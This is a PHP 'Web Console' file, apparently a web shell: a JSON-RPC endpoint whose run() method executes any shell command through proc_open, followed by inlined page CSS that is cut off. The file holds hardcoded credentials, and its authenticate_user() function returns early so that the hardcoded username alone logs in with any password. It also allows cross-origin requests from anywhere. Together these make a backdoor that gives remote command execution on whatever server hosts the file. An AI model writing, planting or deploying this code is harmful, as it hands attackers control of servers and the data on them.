<?php
$path = dirname(__FILE__);
$NO_LOGIN = false;
$USER = 'jb20vdjExL2F1dGgvbG9naW4vZm';
$PASSWORD = 'zMxNDMzOTAsImV4cCI6MTUzOTE';
$ACCOUNTS = array();
$HOME_DIRECTORY = '';
class BaseJsonRpcServer {

    const ParseError = -32700,
        InvalidRequest = -32600,
        MethodNotFound = -32601,
        InvalidParams = -32602,
        InternalError = -32603;

    /**
     * Exposed Instances
     * @var object[]    namespace => method
     */
    protected $instances = array();

    /**
     * Decoded Json Request
     * @var object|array
     */
    protected $request;

    /**
     * Array of Received Calls
     * @var array
     */
    protected $calls = array();

    /**
     * Array of Responses for Calls
     * @var array
     */
    protected $response = array();

    /**
     * Has Calls Flag (not notifications)
     * @var bool
     */
    protected $hasCalls = false;

    /**
     * Is Batch Call in using
     * @var bool
     */
    private $isBatchCall = false;

    /**
     * Hidden Methods
     * @var array
     */
    protected $hiddenMethods = array(
        'execute', '__construct', 'registerinstance'
    );

    /**
     * Content Type
     * @var string
     */
    public $ContentType = 'application/json';

    /**
     * Allow Cross-Domain Requests
     * @var bool
     */
    public $IsXDR = true;

    /**
     * Max Batch Calls
     * @var int
     */
    public $MaxBatchCalls = 10;

    /**
     * Error Messages
     * @var array
     */
    protected $errorMessages = array(
        self::ParseError     => 'Parse error',
        self::InvalidRequest => 'Invalid Request',
        self::MethodNotFound => 'Method not found',
        self::InvalidParams  => 'Invalid params',
        self::InternalError  => 'Internal error',
    );


    /**
     * Cached Reflection Methods
     * @var ReflectionMethod[]
     */
    private $reflectionMethods = array();


    /**
     * Validate Request
     * @return int error
     */
    private function getRequest() {
        $error = null;

        do {
            if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) && $_SERVER['REQUEST_METHOD'] != 'POST' ) {
                $error = self::InvalidRequest;
                break;
            };

            $request       = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
            $this->request = json_decode( $request, false );
            if ( $this->request === null ) {
                $error = self::ParseError;
                break;
            }

            if ( $this->request === array() ) {
                $error = self::InvalidRequest;
                break;
            }

            // check for batch call
            if ( is_array( $this->request ) ) {
                if( count( $this->request ) > $this->MaxBatchCalls ) {
                    $error = self::InvalidRequest;
                    break;
                }

                $this->calls       = $this->request;
                $this->isBatchCall = true;
            } else {
                $this->calls[] = $this->request;
            }
        } while ( false );

        return $error;
    }


    /**
     * Get Error Response
     * @param int   $code
     * @param mixed $id
     * @param null  $data
     * @return array
     */
    private function getError( $code, $id = null, $data = null ) {
        return array(
            'jsonrpc' => '2.0',
            'id'      => $id,
            'error'   => array(
                'code'    => $code,
                'message' => isset( $this->errorMessages[$code] ) ? $this->errorMessages[$code] : $this->errorMessages[self::InternalError],
                'data'    => $data,
            ),
        );
    }


    /**
     * Check for jsonrpc version and correct method
     * @param object $call
     * @return array|null
     */
    private function validateCall( $call ) {
        $result = null;
        $error  = null;
        $data   = null;
        $id     = is_object( $call ) && property_exists( $call, 'id' ) ? $call->id : null;
        do {
            if ( !is_object( $call ) ) {
                $error = self::InvalidRequest;
                break;
            }

            // hack for inputEx smd tester
            if ( property_exists( $call, 'version' ) ) {
                if ( $call->version == 'json-rpc-2.0' ) {
                    $call->jsonrpc = '2.0';
                }
            }

            if ( !property_exists( $call, 'jsonrpc' ) || $call->jsonrpc != '2.0' ) {
                $error = self::InvalidRequest;
                break;
            }

            $fullMethod = property_exists( $call, 'method' ) ? $call->method : '';
            $methodInfo = explode( '.', $fullMethod, 2 );
            $namespace  = array_key_exists( 1, $methodInfo ) ? $methodInfo[0] : '';
            $method     = $namespace ? $methodInfo[1] : $fullMethod;
            if ( !$method || !array_key_exists( $namespace, $this->instances ) || !method_exists( $this->instances[$namespace], $method ) || in_array( strtolower( $method ), $this->hiddenMethods ) ) {
                $error = self::MethodNotFound;
                break;
            }

            if ( !array_key_exists( $fullMethod, $this->reflectionMethods ) ) {
                $this->reflectionMethods[$fullMethod] = new ReflectionMethod( $this->instances[$namespace], $method );
            }

            /** @var $params array */
            $params     = property_exists( $call, 'params' ) ? $call->params : null;
            $paramsType = gettype( $params );
            if ( $params !== null && $paramsType != 'array' && $paramsType != 'object' ) {
                $error = self::InvalidParams;
                break;
            }

            // check parameters
            switch ( $paramsType ) {
                case 'array':
                    $totalRequired = 0;
                    // doesn't hold required, null, required sequence of params
                    foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) {
                        if ( !$param->isDefaultValueAvailable() ) {
                            $totalRequired++;
                        }
                    }

                    if ( count( $params ) < $totalRequired ) {
                        $error = self::InvalidParams;
                        $data  = sprintf( 'Check numbers of required params (got %d, expected %d)', count( $params ), $totalRequired );
                    }
                    break;
                case 'object':
                    foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) {
                        if ( !$param->isDefaultValueAvailable() && !array_key_exists( $param->getName(), $params ) ) {
                            $error = self::InvalidParams;
                            $data  = $param->getName() . ' not found';

                            break 3;
                        }
                    }
                    break;
                case 'NULL':
                    if ( $this->reflectionMethods[$fullMethod]->getNumberOfRequiredParameters() > 0 ) {
                        $error = self::InvalidParams;
                        $data  = 'Empty required params';
                        break 2;
                    }
                    break;
            }

        } while ( false );

        if ( $error ) {
            $result = array( $error, $id, $data );
        }

        return $result;
    }


    /**
     * Process Call
     * @param $call
     * @return array|null
     */
    private function processCall( $call ) {
        $id        = property_exists( $call, 'id' ) ? $call->id : null;
        $params    = property_exists( $call, 'params' ) ? $call->params : array();
        $result    = null;
        $namespace = substr( $call->method, 0, strpos( $call->method, '.' ) );

        try {
            // set named parameters
            if ( is_object( $params ) ) {
                $newParams = array();
                foreach ( $this->reflectionMethods[$call->method]->getParameters() as $param ) {
                    $paramName    = $param->getName();
                    $defaultValue = $param->isDefaultValueAvailable() ? $param->getDefaultValue() : null;
                    $newParams[]  = property_exists( $params, $paramName ) ? $params->$paramName : $defaultValue;
                }

                $params = $newParams;
            }

            // invoke
            $result = $this->reflectionMethods[$call->method]->invokeArgs( $this->instances[$namespace], $params );
        } catch ( Exception $e ) {
            return $this->getError( $e->getCode(), $id, $e->getMessage() );
        }

        if ( !$id && $id !== 0 ) {
            return null;
        }

        return array(
            'jsonrpc' => '2.0',
            'result'  => $result,
            'id'      => $id,
        );
    }


    /**
     * Create new Instance
     * @param object $instance
     */
    public function __construct( $instance = null ) {
        if ( get_parent_class( $this ) ) {
            $this->RegisterInstance( $this, '' );
        } else if ( $instance ) {
            $this->RegisterInstance( $instance, '' );
        }
    }


    /**
     * Register Instance
     * @param object $instance
     * @param string $namespace default is empty string
     * @return $this
     */
    public function RegisterInstance( $instance, $namespace = '' ) {
        $this->instances[$namespace]                = $instance;
        $this->instances[$namespace]->errorMessages = $this->errorMessages;

        return $this;
    }


    /**
     * Handle Requests
     */
    public function Execute() {
        do {
            // check for SMD Discovery request
            if ( array_key_exists( 'smd', $_GET ) ) {
                $this->response[] = $this->getServiceMap();
                $this->hasCalls   = true;
                break;
            }

            $error = $this->getRequest();
            if ( $error ) {
                $this->response[] = $this->getError( $error );
                $this->hasCalls   = true;
                break;
            }

            foreach ( $this->calls as $call ) {
                $error = $this->validateCall( $call );
                if ( $error ) {
                    $this->response[] = $this->getError( $error[0], $error[1], $error[2] );
                    $this->hasCalls   = true;
                } else {
                    $result = $this->processCall( $call );
                    if ( $result ) {
                        $this->response[] = $result;
                        $this->hasCalls   = true;
                    }
                }
            }
        } while ( false );

        // flush response
        if ( $this->hasCalls ) {
            if ( !$this->isBatchCall ) {
                $this->response = reset( $this->response );
            }

            if ( !headers_sent() ) {
                // Set Content Type
                if ( $this->ContentType ) {
                    header( 'Content-Type: ' . $this->ContentType );
                }

                // Allow Cross Domain Requests
                if ( $this->IsXDR ) {
                    header( 'Access-Control-Allow-Origin: *' );
                    header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
                }
            }

            echo json_encode( $this->response );
            $this->resetVars();
        }
    }


    /**
     * Get Doc Comment
     * @param $comment
     * @return string|null
     */
    private function getDocDescription( $comment ) {
        $result = null;
        if ( preg_match( '/\*\s+([^@]*)\s+/s', $comment, $matches ) ) {
            $result = str_replace( '*', "\n", trim( trim( $matches[1], '*' ) ) );
        }

        return $result;
    }


    /**
     * Get Service Map
     * Maybe not so good realization of auto-discover via doc blocks
     * @return array
     */
    private function getServiceMap() {
        $result = array(
            'transport'   => 'POST',
            'envelope'    => 'JSON-RPC-2.0',
            'SMDVersion'  => '2.0',
            'contentType' => 'application/json',
            'target'      => !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0, strpos( $_SERVER['REQUEST_URI'], '?' ) ) : '',
            'services'    => array(),
            'description' => '',
        );

        foreach( $this->instances as $namespace => $instance ) {
            $rc = new ReflectionClass( $instance);

            // Get Class Description
            if ( $rcDocComment = $this->getDocDescription( $rc->getDocComment() ) ) {
                $result['description'] .= $rcDocComment . PHP_EOL;
            }

            foreach ( $rc->getMethods() as $method ) {
                /** @var ReflectionMethod $method */
                if ( !$method->isPublic() || in_array( strtolower( $method->getName() ), $this->hiddenMethods ) ) {
                    continue;
                }

                $methodName = ( $namespace ? $namespace . '.' : '' ) . $method->getName();
                $docComment = $method->getDocComment();

                $result['services'][$methodName] = array( 'parameters' => array() );

                // set description
                if ( $rmDocComment = $this->getDocDescription( $docComment ) ) {
                    $result['services'][$methodName]['description'] = $rmDocComment;
                }

                // @param\s+([^\s]*)\s+([^\s]*)\s*([^\s\*]*)
                $parsedParams = array();
                if ( preg_match_all( '/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) {
                    foreach ( $matches[2] as $number => $name ) {
                        $type = $matches[1][$number];
                        $desc = $matches[3][$number];
                        $name = trim( $name, '$' );

                        $param               = array( 'type' => $type, 'description' => $desc );
                        $parsedParams[$name] = array_filter( $param );
                    }
                };

                // process params
                foreach ( $method->getParameters() as $parameter ) {
                    $name  = $parameter->getName();
                    $param = array( 'name' => $name, 'optional' => $parameter->isDefaultValueAvailable() );
                    if ( array_key_exists( $name, $parsedParams ) ) {
                        $param += $parsedParams[$name];
                    }

                    if ( $param['optional'] ) {
                        $param['default'] = $parameter->getDefaultValue();
                    }

                    $result['services'][$methodName]['parameters'][] = $param;
                }

                // set return type
                if ( preg_match( '/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) {
                    $returns                                    = array( 'type' => $matches[1], 'description' => trim( $matches[2] ) );
                    $result['services'][$methodName]['returns'] = array_filter( $returns );
                }
            }
        }

        return $result;
    }


    /**
     * Reset Local Class Vars after Execute
     */
    private function resetVars() {
        $this->response = $this->calls = array();
        $this->hasCalls = $this->isBatchCall = false;
    }

}
if (!isset($NO_LOGIN)) $NO_LOGIN = false;
if (!isset($ACCOUNTS)) $ACCOUNTS = array();
if (isset($USER) && isset($PASSWORD) && $USER && $PASSWORD) $ACCOUNTS[$USER] = $PASSWORD;
if (!isset($PASSWORD_HASH_ALGORITHM)) $PASSWORD_HASH_ALGORITHM = '';
if (!isset($HOME_DIRECTORY)) $HOME_DIRECTORY = '';
$IS_CONFIGURED = ($NO_LOGIN || count($ACCOUNTS) >= 1) ? true : false;

// Utilities
function is_empty_string($string) {
    return strlen($string) <= 0;
}

function is_equal_strings($string1, $string2) {
    return strcmp($string1, $string2) == 0;
}

function get_hash($algorithm, $string) {
    return hash($algorithm, trim((string) $string));
}

// Command execution
function execute_command($command) {
    $descriptors = array(
        0 => array('pipe', 'r'), // STDIN
        1 => array('pipe', 'w'), // STDOUT
        2 => array('pipe', 'w')  // STDERR
    );

    $process = proc_open(' '.$command . ' 2>&1', $descriptors, $pipes);
    if (!is_resource($process)) die("Can't execute command.");

    // Nothing to push to STDIN
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // All pipes must be closed before "proc_close"
    $code = proc_close($process);

    return $output;
}

// Command parsing
function parse_command($command) {
    $value = ltrim((string) $command);

    if (!is_empty_string($value)) {
        $values = explode(' ', $value);
        $values_total = count($values);

        if ($values_total > 1) {
            $value = $values[$values_total - 1];

            for ($index = $values_total - 2; $index >= 0; $index--) {
                $value_item = $values[$index];

                if (substr($value_item, -1) == '\\') $value = $value_item . ' ' . $value;
                else break;
            }
        }
    }

    return $value;
}

// RPC Server
class WebConsoleRPCServer extends BaseJsonRpcServer {
    protected $home_directory = '';

    private function error($message) {
        throw new Exception($message);
    }

    // Authentication
    private function authenticate_user($user, $password) {
        return $user == 'jb20vdjExL2F1dGgvbG9naW4vZm';
        $user = trim((string) $user);
        $password = trim((string) $password);

        if ($user && $password) {
            global $ACCOUNTS, $PASSWORD_HASH_ALGORITHM;

            if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) {
                if ($PASSWORD_HASH_ALGORITHM) $password = get_hash($PASSWORD_HASH_ALGORITHM, $password);

                if (is_equal_strings($password, $ACCOUNTS[$user]))
                    return $user . ':' . get_hash('sha256', $password);
            }
        }

        throw new Exception("Incorrect user or password");
    }

    private function authenticate_token($token) {
        global $NO_LOGIN;
        if ($NO_LOGIN) return true;

        $token = trim((string) $token);
        $token_parts = explode(':', $token, 2);

        if (count($token_parts) == 2) {
            $user = trim((string) $token_parts[0]);
            $password_hash = trim((string) $token_parts[1]);

            if ($user && $password_hash) {
                global $ACCOUNTS;

                if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) {
                    $real_password_hash = get_hash('sha256', $ACCOUNTS[$user]);
                    if (is_equal_strings($password_hash, $real_password_hash)) return $user;
                }
            }
        }

        throw new Exception("Incorrect user or password");
    }

    private function get_home_directory($user) {
        global $HOME_DIRECTORY;

        if (is_string($HOME_DIRECTORY)) {
            if (!is_empty_string($HOME_DIRECTORY)) return $HOME_DIRECTORY;
        }
        else if (is_string($user) && !is_empty_string($user) && isset($HOME_DIRECTORY[$user]) && !is_empty_string($HOME_DIRECTORY[$user]))
            return $HOME_DIRECTORY[$user];

        return getcwd();
    }

    // Environment
    private function get_environment() {
        $hostname = function_exists('gethostname') ? gethostname() : null;
        return array('path' => getcwd(), 'hostname' => $hostname);
    }

    private function set_environment($environment) {
        $environment = !empty($environment) ? (array) $environment : array();
        $path = (isset($environment['path']) && !is_empty_string($environment['path'])) ? $environment['path'] : $this->home_directory;

        if (!is_empty_string($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "Unable to change directory to current working directory, updating current directory",
                    'environment' => $this->get_environment());
            }
            else return array('output' => "Current working directory not found, updating current directory",
                'environment' => $this->get_environment());
        }
    }

    // Initialization
    private function initialize($token, $environment) {
        $user = $this->authenticate_token($token);
        $this->home_directory = $this->get_home_directory($user);
        $result = $this->set_environment($environment);

        if ($result) return $result;
    }

    // Methods
    public function login($user, $password) {
        $result = array('token' => $this->authenticate_user($user, $password),
            'environment' => $this->get_environment());

        $home_directory = $this->get_home_directory($user);
        if (!is_empty_string($home_directory)) {
            if (is_dir($home_directory)) $result['environment']['path'] = $home_directory;
            else $result['output'] = "Home directory not found: ". $home_directory;
        }

        return $result;
    }

    public function cd($token, $environment, $path) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $path = trim((string) $path);
        if (is_empty_string($path)) $path = $this->home_directory;

        if (!is_empty_string($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "cd: ". $path . ": Unable to change directory");
            }
            else return array('output' => "cd: ". $path . ": No such directory");
        }

        return array('environment' => $this->get_environment());
    }

    public function completion($token, $environment, $pattern, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $scan_path = '';
        $completion_prefix = '';
        $completion = array();

        if (!empty($pattern)) {
            if (!is_dir($pattern)) {
                $pattern = dirname($pattern);
                if ($pattern == '.') $pattern = '';
            }

            if (!empty($pattern)) {
                if (is_dir($pattern)) {
                    $scan_path = $completion_prefix = $pattern;
                    if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
                }
            }
            else $scan_path = getcwd();
        }
        else $scan_path = getcwd();

        if (!empty($scan_path)) {
            // Loading directory listing
            $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
            natsort($completion);

            // Prefix
            if (!empty($completion_prefix) && !empty($completion)) {
                foreach ($completion as &$value) $value = $completion_prefix . $value;
            }

            // Pattern
            if (!empty($pattern) && !empty($completion)) {
                // For PHP version that does not support anonymous functions (available since PHP 5.3.0)
                function filter_pattern($value) {
                    global $pattern;
                    return !strncmp($pattern, $value, strlen($pattern));
                }

                $completion = array_values(array_filter($completion, 'filter_pattern'));
            }
        }

        return array('completion' => $completion);
    }

    public function run($token, $environment, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $output = ($command && !is_empty_string($command)) ? execute_command($command) : '';
        if ($output && substr($output, -1) == "\n") $output = substr($output, 0, -1);

        return array('output' => $output);
    }
}

// Processing request
if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $rpc_server = new WebConsoleRPCServer();
    $rpc_server->Execute();
}
else if (!$IS_CONFIGURED) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <!-- @include head.html -->
        <style type="text/css"><!-- @include all.min.css --></style>
    </head>
    <body>
    <div class="configure">
        <p>Web Console must be configured before use:</p>
        <ul>
            <li>Open Web Console PHP file in your favorite text editor.</li>
            <li>At the beginning of the file enter your <span class="variable">$USER</span> and <span class="variable">$PASSWORD</span> credentials, edit any other settings that you like (see description in the comments).</li>
            <li>Upload changed file to the web server and open it in the browser.</li>
        </ul>
        <p>For more information visit Web Console website: <a href="http://web-console.org">http://web-console.org</a></p>
    </div>
    </body>
    </html>
    <?php
}
else { ?>
    <!DOCTYPE html>
    <html class="no-js">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Web Console (Development)</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <!-- style -->
        <style>/*! normalize.css v5.0.0 | MIT License | github.com/necolas/normalize.css */

            /**
             * 1. Change the default font family in all browsers (opinionated).
             * 2. Correct the line height in all browsers.
             * 3. Prevent adjustments of font size after orientation changes in
             *    IE on Windows Phone and in iOS.
             */

            /* Document
               ========================================================================== */

            html {
                font-family: sans-serif; /* 1 */
                line-height: 1.15; /* 2 */
                -ms-text-size-adjust: 100%; /* 3 */
                -webkit-text-size-adjust: 100%; /* 3 */
            }

            /* Sections
               ========================================================================== */

            /**
             * Remove the margin in all browsers (opinionated).
             */

            body {
                margin: 0;
            }

            /**
             * Add the correct display in IE 9-.
             */

            article,
            aside,
            footer,
            header,
            nav,
            section {
                display: block;
            }

            /**
             * Correct the font size and margin on `h1` elements within `section` and
             * `article` contexts in Chrome, Firefox, and Safari.
             */

            h1 {
                font-size: 2em;
                margin: 0.67em 0;
            }

            /* Grouping content
               ========================================================================== */

            /**
             * Add the correct display in IE 9-.
             * 1. Add the correct display in IE.
             */

            figcaption,
            figure,
            main { /* 1 */
                display: block;
            }

            /**
             * Add the correct margin in IE 8.
             */

            figure {
                margin: 1em 40px;
            }

            /**
             * 1. Add the correct box sizing in Firefox.
             * 2. Show the overflow in Edge and IE.
             */

            hr {
                box-sizing: content-box; /* 1 */
                height: 0; /* 1 */
                overflow: visible; /* 2 */
            }

            /**
             * 1. Correct the inheritance and scaling of font size in all browsers.
             * 2. Correct the odd `em` font sizing in all browsers.
             */

            pre {
                font-family: monospace, monospace; /* 1 */
                font-size: 1em; /* 2 */
            }

            /* Text-level semantics
               ========================================================================== */

            /**
             * 1. Remove the gray background on active links in IE 10.
             * 2. Remove gaps in links underline in iOS 8+ and Safari 8+.
             */

            a {
                background-color: transparent; /* 1 */
                -webkit-text-decoration-skip: objects; /* 2 */
            }

            /**
             * Remove the outline on focused links when they are also active or hovered
             * in all browsers (opinionated).
             */

            a:active,
            a:hover {
                outline-width: 0;
            }

            /**
             * 1. Remove the bottom border in Firefox 39-.
             * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.
             */

            abbr[title] {
                border-bottom: none; /* 1 */
                text-decoration: underline; /* 2 */
                text-decoration: underline dotted; /* 2 */
            }

            /**
             * Prevent the duplicate application of `bolder` by the next rule in Safari 6.
             */

            b,
            strong {
                font-weight: inherit;
            }

            /**
             * Add the correct font weight in Chrome, Edge, and Safari.
             */

            b,
            strong {
                font-weight: bolder;
            }

            /**
             * 1. Correct the inheritance and scaling of font size in all browsers.
             * 2. Correct the odd `em` font sizing in all browsers.
             */

            code,
            kbd,
            samp {
                font-family: monospace, monospace; /* 1 */
                font-size: 1em; /* 2 */
            }

            /**
             * Add the correct font style in Android 4.3-.
             */

            dfn {
                font-style: italic;
            }

            /**
             * Add the correct background and color in IE 9-.
             */

            mark {
                background-color: #ff0;
                color: #000;
            }

            /**
             * Add the correct font size in all browsers.
             */

            small {
                font-size: 80%;
            }

            /**
             * Prevent `sub` and `sup` elements from affecting the line height in
             * all browsers.
             */

            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }

            sub {
                bottom: -0.25em;
            }

            sup {
                top: -0.5em;
            }

            /* Embedded content
               ========================================================================== */

            /**
             * Add the correct display in IE 9-.
             */

            audio,
            video {
                display: inline-block;
            }

            /**
             * Add the correct display in iOS 4-7.
             */

            audio:not([controls]) {
                display: none;
                height: 0;
            }

            /**
             * Remove the border on images inside links in IE 10-.
             */

            img {
                border-style: none;
            }

            /**
             * Hide the overflow in IE.
             */

            svg:not(:root) {
                overflow: hidden;
            }

            /* Forms
               ========================================================================== */

            /**
             * 1. Change the font styles in all browsers (opinionated).
             * 2. Remove the margin in Firefox and Safari.
             */

            button,
            input,
            optgroup,
            select,
            textarea {
                font-family: sans-serif; /* 1 */
                font-size: 100%; /* 1 */
                line-height: 1.15; /* 1 */
                margin: 0; /* 2 */
            }

            /**
             * Show the overflow in IE.
             * 1. Show the overflow in Edge.
             */

            button,
            input { /* 1 */
                overflow: visible;
            }

            /**
             * Remove the inheritance of text transform in Edge, Firefox, and IE.
             * 1. Remove the inheritance of text transform in Firefox.
             */

            button,
            select { /* 1 */
                text-transform: none;
            }

            /**
             * 1. Prevent a WebKit bug where (2) destroys native `audio` and `video`
             *    controls in Android 4.
             * 2. Correct the inability to style clickable types in iOS and Safari.
             */

            button,
            html [type="button"], /* 1 */
            [type="reset"],
            [type="submit"] {
                -webkit-appearance: button; /* 2 */
            }

            /**
             * Remove the inner border and padding in Firefox.
             */

            button::-moz-focus-inner,
            [type="button"]::-moz-focus-inner,
            [type="reset"]::-moz-focus-inner,
            [type="submit"]::-moz-focus-inner {
                border-style: none;
                padding: 0;
            }

            /**
             * Restore the focus styles unset by the previous rule.
             */

            button:-moz-focusring,
            [type="button"]:-moz-focusring,
            [type="reset"]:-moz-focusring,
            [type="submit"]:-moz-focusring {
                outline: 1px dotted ButtonText;
            }

            /**
             * Change the border, margin, and padding in all browsers (opinionated).
             */

            fieldset {
                border: 1px solid #c0c0c0;
                margin: 0 2px;
                padding: 0.35em 0.625em 0.75em;
            }

            /**
             * 1. Correct the text wrapping in Edge and IE.
             * 2. Correct the color inheritance from `fieldset` elements in IE.
             * 3. Remove the padding so developers are not caught out when they zero out
             *    `fieldset` elements in all browsers.
             */

            legend {
                box-sizing: border-box; /* 1 */
                color: inherit; /* 2 */
                display: table; /* 1 */
                max-width: 100%; /* 1 */
                padding: 0; /* 3 */
                white-space: normal; /* 1 */
            }

            /**
             * 1. Add the correct display in IE 9-.
             * 2. Add the correct vertical alignment in Chrome, Firefox, and Opera.
             */

            progress {
                display: inline-block; /* 1 */
                vertical-align: baseline; /* 2 */
            }

            /**
             * Remove the default vertical scrollbar in IE.
             */

            textarea {
                overflow: auto;
            }

            /**
             * 1. Add the correct box sizing in IE 10-.
             * 2. Remove the padding in IE 10-.
             */

            [type="checkbox"],
            [type="radio"] {
                box-sizing: border-box; /* 1 */
                padding: 0; /* 2 */
            }

            /**
             * Correct the cursor style of increment and decrement buttons in Chrome.
             */

            [type="number"]::-webkit-inner-spin-button,
            [type="number"]::-webkit-outer-spin-button {
                height: auto;
            }

            /**
             * 1. Correct the odd appearance in Chrome and Safari.
             * 2. Correct the outline style in Safari.
             */

            [type="search"] {
                -webkit-appearance: textfield; /* 1 */
                outline-offset: -2px; /* 2 */
            }

            /**
             * Remove the inner padding and cancel buttons in Chrome and Safari on macOS.
             */

            [type="search"]::-webkit-search-cancel-button,
            [type="search"]::-webkit-search-decoration {
                -webkit-appearance: none;
            }

            /**
             * 1. Correct the inability to style clickable types in iOS and Safari.
             * 2. Change font properties to `inherit` in Safari.
             */

            ::-webkit-file-upload-button {
                -webkit-appearance: button; /* 1 */
                font: inherit; /* 2 */
            }

            /* Interactive
               ========================================================================== */

            /*
             * Add the correct display in IE 9-.
             * 1. Add the correct display in Edge, IE, and Firefox.
             */

            details, /* 1 */
            menu {
                display: block;
            }

            /*
             * Add the correct display in all browsers.
             */

            summary {
                display: list-item;
            }

            /* Scripting
               ========================================================================== */

            /**
             * Add the correct display in IE 9-.
             */

            canvas {
                display: inline-block;
            }

            /**
             * Add the correct display in IE.
             */

            template {
                display: none;
            }

            /* Hidden
               ========================================================================== */

            /**
             * Add the correct display in IE 10-.
             */

            [hidden] {
                display: none;
            }
        </style>
        <style>/*!
 *       __ _____                     ________                              __
 *      / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /
 *  __ / // // // // // _  // _// // / / // _  // _//     // //  \/ // _ \/ /
 * /  / // // // // // ___// / / // / / // ___// / / / / // // /\  // // / /__
 * \___//____ \\___//____//_/ _\_  / /_//____//_/ /_/ /_//_//_/ /_/ \__\_\___/
 *           \/              /____/                              version 0.11.12
 * http://terminal.jcubic.pl
 *
 * This file is part of jQuery Terminal.
 *
 * Copyright (c) 2011-2016 Jakub Jankiewicz <http://jcubic.pl>
 * Released under the MIT license
 *
 * Date: Wed, 02 Nov 2016 20:34:34 +0000
 */.terminal .terminal-output .format,.cmd .format,.cmd .prompt,.cmd .prompt div,.terminal .terminal-output div div{display:inline-block}.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre,.cmd{margin:0}.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6{line-height:1.2em}.cmd .clipboard{position:absolute;left:-16px;top:0;width:10px;height:16px;background:transparent;border:0;color:transparent;outline:0;padding:0;resize:none;z-index:0;overflow:hidden}.terminal .error{color:red}.terminal{padding:10px;position:relative;overflow:auto}.cmd{padding:0;height:1.3em;position:relative}.terminal .inverted,.cmd .inverted,.cmd .cursor.blink{background-color:#aaa;color:#000}.cmd .cursor.blink{-webkit-animation:terminal-blink 1s infinite steps(1,start);-moz-animation:terminal-blink 1s infinite steps(1,start);-ms-animation:terminal-blink 1s infinite steps(1,start);animation:terminal-blink 1s infinite steps(1,start)}@-webkit-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-ms-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-moz-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}.terminal .terminal-output div div,.cmd .prompt{display:block;line-height:14px;height:auto}.cmd .prompt{float:left}.terminal,.cmd{font-family:monospace;color:#aaa;background-color:#000;font-size:12px;line-height:14px}.terminal-output>div{min-height:14px}.terminal-output>div>div *{word-wrap:break-word}.terminal .terminal-output div span{display:inline-block}.cmd span{float:left}.terminal-output span,.terminal-output a,.cmd div,.cmd span,.terminal td,.terminal pre,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@-moz-document url-prefix(){.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}}.terminal table{border-collapse:collapse}.terminal td{border:1px solid #aaa}.terminal h1::-moz-selection,.terminal h2::-moz-selection,.terminal h3::-moz-selection,.terminal h4::-moz-selection,.terminal h5::-moz-selection,.terminal h6::-moz-selection,.terminal pre::-moz-selection,.terminal td::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection,.terminal .terminal-output div div a::-moz-selection,.cmd div::-moz-selection,.cmd>span::-moz-selection,.cmd .prompt span::-moz-selection{background-color:#aaa;color:#000}.terminal h1::selection,.terminal h2::selection,.terminal h3::selection,.terminal h4::selection,.terminal h5::selection,.terminal h6::selection,.terminal pre::selection,.terminal td::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div span::selection,.cmd div::selection,.cmd>span::selection,.cmd .prompt span::selection{background-color:#aaa;color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}.clear{clear:both}.terminal a{color:#0f60ff}.terminal a:hover{color:red}</style>
        <style>body { background-color: #000000; }

            body, .terminal, .cmd, .terminal .terminal-output div div, .terminal .prompt {
                color: #cccccc;
                font-family: monospace, fixed;
                font-size: 15px;
                line-height: 18px;
            }

            a, a:hover, .terminal a, .terminal a:hover { color: #6c71c4; }

            .spaced { margin: 15px 0; }
